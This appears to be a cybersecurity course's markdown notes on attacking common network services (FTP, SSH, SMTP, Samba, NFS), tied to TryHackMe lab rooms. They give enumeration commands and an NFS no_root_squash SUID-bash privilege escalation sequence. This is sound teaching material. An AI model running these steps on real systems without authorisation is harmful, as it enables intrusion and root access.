# Protocols & services notes

[![protocolsandservers](../../_badges/thmp/protocolsandservers.svg)](https://tryhackme.com/room/protocolsandservers)
[![protocolsandservers2](../../_badges/thmp/protocolsandservers2.svg)](https://tryhackme.com/room/protocolsandservers2)
[![networkservices](../../_badges/thmp/networkservices.svg)](https://tryhackme.com/room/networkservices)
[![networkservices2](../../_badges/thmp/networkservices2.svg)](https://tryhackme.com/room/networkservices2)

This couse IS NOT a course about protocols/services, the knowledge inside is partial as it's intended to be used in complement of the [Protocols & Services course](/info/networking/protocols/index.md). In this course, there will only be additional notes useful from a cybersecurity point of view.

> You may also check [Cyber/Bruteforce services](/cyber/exploitation/services/bruteforce.md) to try to bruteforce a service credentials.

<hr class="sep-both">

## File Transfer protocol - 21 (tcp)

[See FTP Protocol for more information](/info/networking/protocols/index.md#-ftp---21-tcp)

<div class="row row-cols-md-2"><div>

* Anonymous user may have been enabled

```bash
$ ftp anonymous@IP
```
</div></div>

<hr class="sep-both">

## SSH - 22 (tcp)

[See SSH service for more information](/info/networking/protocols/index.md#-ssh---22-tcp)

<div class="row row-cols-md-2"><div>

It's usually helpful to know that users may have a folder `.ssh` in their home, in which there are SSH Keys/... To avoid transferring passwords, servers can allow users to connect using an SSH private key. The key may be protected by a passphrase. Once the user enter the passphrase, the key is unlocked, and can be used by `ssh`.

* If there is no passphrase, a hacker can use it to connect to a server.
* Else, the hacker may try to [brute force it](/cyber/random/crack_password/index.md#ssh-private-key---passphrase-cracking).
</div><div>

The private key is usually called `id_rsa`, while the public key is usually called `id_rsa.pub`. You will find inside an email which was used to sign the key. The email can help finding the username.

```bash
# if you downloaded a key, 
# you need to set the permissions correctly
$ chmod 600 /tmp/id_rsa
$ ssh login@IP -i /tmp/id_rsa
```
</div></div>

<hr class="sep-both">

## SMTP - 25 (tcp)

[See SMTP service for more information](/info/networking/protocols/index.md#-smtp---25-tcp)

<div class="row row-cols-md-2"><div>

* Metasploit

```bash
msf6 > use auxiliary/scanner/smtp/smtp_version # version
msf6 > use auxiliary/scanner/smtp/smtp_enum # users...
```
</div><div>

* Using nmap

```bash
$ nmap IP -p 25 --script "*smtp*"
```

* Using `smtp-user-enum` which is not always working the best

```bash
# https://www.kali.org/tools/smtp-user-enum/
$ smtp-user-enum -M VRFY -u root -t IP
```
</div></div>

<hr class="sep-both">

## Samba - 445 (or 139 before, tcp)

[See Samba service for more information](/info/networking/protocols/index.md#-samba---445-or-139-before-tcp)

[![kenobi](../../_badges/thm/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

* Find shares using nmap

```bash
$ nmap IP -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse
```

* Try connecting anonymously with no password (leave blank)

```bash
$ smbclient //IP/share_name -U Anonymous
```
</div><div>

The tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) (0.7k ‚≠ê) can be used to find shares, and users.

```bash
$ enum4linux options ip
$ enum4linux -a ip
# -a : list all
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : print os information
# -i : print printer information
# -v : verbose
```
</div></div>

<hr class="sep-both">

## NFS - 2049 (tcp)

[See NFS service for more information](/info/networking/protocols/index.md#-nfs---2049-tcp)

<div class="row row-cols-md-2"><div>

* Find mounted folders with nmap

```bash
$ nmap IP -p 2049 --script=nfs-showmount
```
</div><div>

NFS configuration has a vulnerability when **root_squashing** is enabled. This option usually make it that if the local user is considered to be the user "nobody". But, if root_squashing is disabled, then the root user on the local machine will have root privilege inside the share.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>